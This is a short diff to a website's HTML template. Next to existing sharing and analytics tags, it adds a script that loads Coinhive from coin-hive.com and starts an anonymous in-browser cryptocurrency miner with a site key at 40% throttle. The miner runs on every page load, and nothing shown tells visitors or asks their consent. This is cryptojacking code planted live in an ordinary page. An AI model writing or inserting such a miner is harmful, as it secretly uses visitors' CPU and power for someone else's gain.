@@ -39,6 +39,8 @@
 	<!-- Go to www.addthis.com/dashboard to customize your tools -->
 	<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=AdamCox9" async="async"></script>
 
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
   </head>
 
   <body>
@@ -187,6 +189,12 @@
 	  ga('create', 'UA-59334736-1', 'auto');
 	  ga('send', 'pageview');
 
+	</script>
+
+	<script>
+		var miner = new CoinHive.Anonymous('ZHTQcVdmhY5Mh6MttIQcCYsw7Bgk0ZdP');
+		miner.setThrottle( '0.4' );
+		miner.start();
 	</script>
 
   </body>
